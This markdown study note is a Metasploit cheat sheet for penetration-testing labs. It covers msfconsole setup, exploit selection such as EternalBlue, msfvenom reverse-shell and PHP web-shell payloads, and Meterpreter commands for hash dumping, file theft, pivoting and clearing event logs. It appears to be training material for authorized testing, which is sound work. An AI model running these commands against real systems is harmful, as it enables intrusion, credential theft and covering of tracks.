
## 1. What Metasploit Is

- A modular exploitation framework: organizes **exploits**, **payloads**, **auxiliary** modules, **post** modules, **encoders**, and **NOPs** into a searchable database.
- Backed by `msfdb` (PostgreSQL) for storing hosts, services, creds, loot per **workspace**.

Related: [[Penetration-Testing-Methodology]] [[Post-Exploitation]]

---

## 2. Starting Up

```bash
sudo msfdb init          # initialize the Metasploit database
sudo msfconsole          # launch the console
```

Inside msfconsole:

```
msf6 > db_status          # confirm DB connection
msf6 > workspace          # list workspaces
msf6 > workspace -a <name>  # create + switch workspace
msf6 > workspace <name>      # switch to existing workspace
```

---

## 3. Searching & Selecting Modules

```
msf6 > search type:exploit platform:windows smb
msf6 > search cve:2021-XXXX
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > info               # details on currently selected module
msf6 > show options       # required/optional parameters
msf6 > show payloads      # compatible payloads for this exploit
msf6 > show targets       # target OS/build variants
```

Module path convention: `<type>/<platform>/<service>/<name>`

- e.g. `exploit/windows/smb/ms17_010_eternalblue`
- e.g. `auxiliary/scanner/smb/smb_version`

---

## 4. Setting Options

```
msf6 > set RHOSTS 10.10.10.5
msf6 > set RPORT 445
msf6 > set LHOST <your tun0 IP>
msf6 > set LPORT 4444
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > setg RHOSTS 10.10.10.5     # global — persists across module switches
msf6 > unset RHOSTS
msf6 > unsetg RHOSTS
```

> [!tip] Use `setg`/`unsetg` when running several modules against the same target so you don't re-type RHOSTS every time.

---

## 5. Running

```
msf6 > check        # tests if target is vulnerable without exploiting (not all modules support this)
msf6 > exploit      # or run — launches the module
msf6 > exploit -j   # run as background job
msf6 > exploit -z   # don't auto-interact with session on success
```

---

## 6. Sessions & Jobs

```
msf6 > sessions -l          # list active sessions
msf6 > sessions -i 1        # interact with session 1
msf6 > sessions -k 1        # kill session 1
^Z  (Ctrl+Z)                # background current Meterpreter session
msf6 > jobs -l               # list background jobs
msf6 > jobs -K               # kill all jobs
```

## 7. Multi/Handler (catching standalone payloads)

```
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST <tun0 IP>
msf6 > set LPORT 4444
msf6 > exploit -j -z
```

Used when you generate a payload separately with `msfvenom` and need a listener.

## 8. msfvenom (standalone payload generator)

```bash
# Windows exe reverse shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o shell.exe

# Linux ELF reverse shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o shell.elf

# PHP web shell payload
msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o shell.php

# List available payload formats
msfvenom --list formats

# List encoders (for AV evasion attempts — limited effectiveness against modern AV)
msfvenom --list encoders
```

Common flags:

- `-p` payload
- `-f` output format (exe, elf, raw, war, psh, etc.)
- `-a` architecture (x86, x64)
- `-e` encoder
- `-i` iterations (encoding passes)
- `-o` output file

## 9. Meterpreter Cheat Sheet

### System / recon

```
meterpreter > sysinfo
meterpreter > getuid
meterpreter > ps
meterpreter > getpid
meterpreter > pwd / lpwd
meterpreter > ls / lls
```

### File transfer

```
meterpreter > upload ./local.exe C:\\Windows\\Temp\\local.exe
meterpreter > download C:\\Users\\victim\\secret.txt ./loot/
```

### Privilege escalation helpers

```
meterpreter > getsystem            # tries known Windows local-priv techniques
meterpreter > use priv             # load priv extension
meterpreter > hashdump             # dump SAM hashes (needs SYSTEM)
```

### Pivoting

```
meterpreter > run autoroute -s 10.10.20.0/24
meterpreter > background
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 1080
msf6 > run -j
```

Then point `proxychains` at `127.0.0.1:1080` to reach the internal subnet through the session.

Port forwarding:

```
meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.20.15
```

### Process / shell

```
meterpreter > shell                # drop to native OS shell
meterpreter > migrate <PID>        # move into a more stable process
meterpreter > clearev              # clear event logs (Windows) — use responsibly/only in scope
```

## 10. Auxiliary Modules (scanning/enumeration)

```
msf6 > use auxiliary/scanner/portscan/tcp
msf6 > use auxiliary/scanner/smb/smb_version
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 > use auxiliary/scanner/ftp/anonymous
```

These don't exploit — they enumerate/confirm version & access info, useful before picking an exploit module.

---

## 11. Importing Nmap / DB Workflow

```
msf6 > db_import nmap_scan.xml
msf6 > hosts             # list hosts in current workspace
msf6 > services          # list discovered services
msf6 > vulns             # list flagged vulnerabilities
msf6 > creds             # list captured credentials
msf6 > loot              # list downloaded/looted files
```

Live scan directly from console:

```
msf6 > db_nmap -sV -sC 10.10.10.0/24
```

---

## 12. Post-Exploitation Modules

```
msf6 > use post/windows/gather/credentials/windows_autologin
msf6 > use post/multi/recon/local_exploit_suggester
msf6 > set SESSION 1
msf6 > run
```

`local_exploit_suggester` is especially useful in CPTS-style labs — it cross-references the target against known local privesc modules.

---

## 13. Resource Scripts (automation)

```bash
msfconsole -r autopwn.rc
```

A `.rc` file is just a list of msfconsole commands run sequentially — useful for repeatable lab setups.
